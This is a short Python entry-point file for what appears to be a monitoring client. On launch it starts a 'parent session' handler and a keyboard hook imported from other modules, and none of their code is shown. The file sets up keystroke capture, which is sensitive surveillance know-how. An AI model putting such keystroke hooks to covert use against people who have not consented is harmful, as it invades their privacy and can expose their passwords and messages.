#region ------ I M P O R T S --------------

from  OperationsHandler  import  *
from  KeyStrokeHandler  import  *
from  ParentSessionHandler  import  *

#endregion



class Client:
    # Client class
    def __init__(self):
        self.parentSessionHandler = ParentSessionHandler()
        self.operationsHandler = OperationsHandler()
        self.keyboardHook = KeyboardHook()

    def start(self):
        self.parentSessionHandler.run()
        self.keyboardHook.start()




Client().start()
